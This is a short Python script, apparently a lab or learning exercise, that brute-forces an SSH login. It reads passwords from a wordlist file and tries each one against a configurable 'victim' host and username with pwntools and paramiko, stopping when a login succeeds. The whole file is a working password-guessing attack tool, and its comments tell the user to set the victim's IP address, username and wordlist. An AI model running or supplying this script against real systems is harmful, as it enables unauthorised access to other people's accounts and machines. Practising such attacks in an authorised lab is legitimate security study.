from pwn import *
import paramiko

host = "127.0.0.1" # Change this to the IP address of the victim
username = "kali" # Change this to the username of the user to be brute-forced into
attempts = 0 

with open("ssh-common-passwords.txt", "r") as password_list: # Change this to select your wordlist
    for password in password_list:
        password = password.strip() 
        try: 
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1) 
            if response.connected(): 
                print("[>] Valid password found: '{}'!".format(password))
                response.close() #
                break
            response.close() 
        except paramiko.ssh_exception.AuthenticationException: 
            print("[X] Invalid password!")
        attempts += 1
